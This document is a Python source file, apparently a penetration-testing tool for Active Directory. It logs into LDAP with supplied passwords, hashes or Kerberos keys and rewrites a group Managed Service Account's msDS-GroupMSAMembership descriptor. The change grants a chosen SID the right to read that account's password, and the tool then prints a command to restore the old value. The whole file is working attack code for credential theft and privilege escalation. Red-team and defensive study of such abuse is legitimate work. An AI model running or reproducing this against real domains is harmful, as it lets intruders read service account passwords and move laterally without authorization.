#!/usr/bin/env python3

import argparse
import struct
import base64
import binascii
import ctypes
from ctypes import *
from ldap3 import SUBTREE, MODIFY_REPLACE, MODIFY_ADD
from ldap_auth import ldap_auth, add_common_parameters

BYTE  = ctypes.c_uint8
WORD  = ctypes.c_uint16
DWORD = ctypes.c_uint32
LPVOID = ctypes.c_void_p

class SID(Structure):
    _fields_ = [
        ('Revision', BYTE),
        ('SubAuthorityCount', BYTE),
        ('IdentifierAuthority', BYTE * 6),
    ]

class ACCESS_ALLOWED_ACE(Structure):
    _fields_ = [
        ('AceType', BYTE),
        ('AceFlags', BYTE),
        ('AceSize', WORD),
        ('Mask', DWORD),
    ]

class ACL(Structure):
    _fields_ = [
        ('AclRevision', BYTE),
        ('Sbz1', BYTE),
        ('AclSize', WORD),
        ('AceCount', WORD),
        ('Sbz2', WORD),
        # then data
    ]

class SECURITY_DESCRIPTOR(Structure):
    _fields_ = [
        ('Revision', BYTE),
        ('Sbz1', BYTE),
        ('Control', WORD),
        ('OffsetOwner', DWORD),
        ('OffsetGroup', DWORD),
        ('OffsetSacl', DWORD),
        ('OffsetDacl', DWORD),
    ]

def build_sid(sid):
    _sid = [int(v) for v in sid.split('-')[1:]]

    sid = SID()
    sid.Revision = _sid[0]
    sid.SubAuthorityCount = len(_sid) - 2
    sid.IdentifierAuthority = (BYTE * 6)(* bytes([0, 0, 0, 0, 0, _sid[1]]))
    SubAuthority = b''

    for v in _sid[2:]:
        SubAuthority += struct.pack('<I', v)

    return bytes(sid) + SubAuthority

def build_ace(sid):
    ace = ACCESS_ALLOWED_ACE()
    ace.AceType = 0
    ace.AceFlags = 0
    ace.AceSize = 0x24
    ace.Mask = 0xf01ff
    return bytes(ace) + build_sid(sid)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    add_common_parameters(parser)
    parser.add_argument('-t', type=str, default=None, metavar='GMSA_TARGET_NAME')
    parser.add_argument('-sid', type=str, default=None, metavar='SID',
        help='The SID to be allowed to read the password of target')
    args = parser.parse_args()

    orig_t = args.t
    orig_hashes = args.hashes
    args.t = args.t.replace('$', '')

    serv, conn = ldap_auth(args)

    conn.search(
        search_base=serv.info.other['defaultNamingContext'][0],
        search_filter=f'(&(name={args.t}))',
        search_scope=SUBTREE,
        attributes = ['msDS-GroupMSAMembership'])

    if 'raw_dn' not in conn.response[0]:
        print(f'[-] error: can\'t find the target {args.t}')
        exit(0)

    dn = conn.response[0]['raw_dn'].decode()
    data = conn.response[0]['raw_attributes']['msDS-GroupMSAMembership']

    new_ace = build_ace(args.sid)

    if data:
        data = data[0]

        print('[+] original value of msDS-GroupMSAMembership is')
        print(binascii.hexlify(data).decode())

        # update SECURITY_DESCRIPTOR

        sd = SECURITY_DESCRIPTOR.from_buffer_copy(data)

        if sd.OffsetDacl < sd.OffsetOwner or \
               sd.OffsetDacl < sd.OffsetGroup or \
               sd.OffsetDacl < sd.OffsetSacl:
            print('[-] unsupported OffsetDacl, it was supposed to be at the end of SD')
            exit(0)

        acl_header = ACL.from_buffer_copy(data[sd.OffsetDacl:])
        acl_header.AceCount += 1
        acl_header.AclSize += len(new_ace)
        dacl = data[sd.OffsetDacl + sizeof(acl_header):]

        final = data[:sd.OffsetDacl] + bytes(acl_header) + dacl + new_ace

        if not conn.modify(dn, {'msDS-GroupMSAMembership': [(MODIFY_REPLACE, [final])]}):
            print(f'[-] permission denied')
            exit(0)
    else:
        print('[+] original value of msDS-GroupMSAMembership is null')

        # build a new SECURITY_DESCRIPTOR

        administrators = build_sid('S-1-5-32-544') # this is the default

        sd = SECURITY_DESCRIPTOR()
        sd.Revision = 1
        sd.Sbz1 = 0
        sd.Control = 0x8004
        sd.OffsetOwner = sizeof(SECURITY_DESCRIPTOR)
        sd.OffsetGroup = 0
        sd.OffsetSacl = 0
        sd.OffsetDacl = sizeof(SECURITY_DESCRIPTOR) + len(administrators)

        acl = ACL()
        acl.AclRevision = 4
        acl.Sbz1 = 0
        acl.AclSize = sizeof(ACL) + len(new_ace)
        acl.AceCount = 1
        acl.Sbz2 = 0

        final = bytes(sd) + administrators + bytes(acl) + new_ace

        if not conn.modify(dn, {'msDS-GroupMSAMembership': [(MODIFY_ADD, [final])]}):
            print(f'[-] permission denied or error occurs')
            exit(0)

    print('[+] the new value is set to:')
    print(binascii.hexlify(final).decode())

    print('[+] if you want to restore the value:')

    cmd = f"./attr.py {args.connection} -key msDS-GroupMSAMembership -t '{orig_t}'"
    if args.dc_ip:
        cmd += f' {args.dc_ip}'
    if orig_hashes:
        cmd += f' -hashes {orig_hashes}'
    if args.k:
        cmd += ' -k'
    if args.aesKey:
        cmd += f' -aesKey {args.aesKey}'
    if args.use_ldaps:
        cmd += ' -use-ldaps'
    if data:
        cmd += f' -hex -w {binascii.hexlify(data).decode()}'
    else:
        cmd += ' -flush -hex'

    print(cmd)
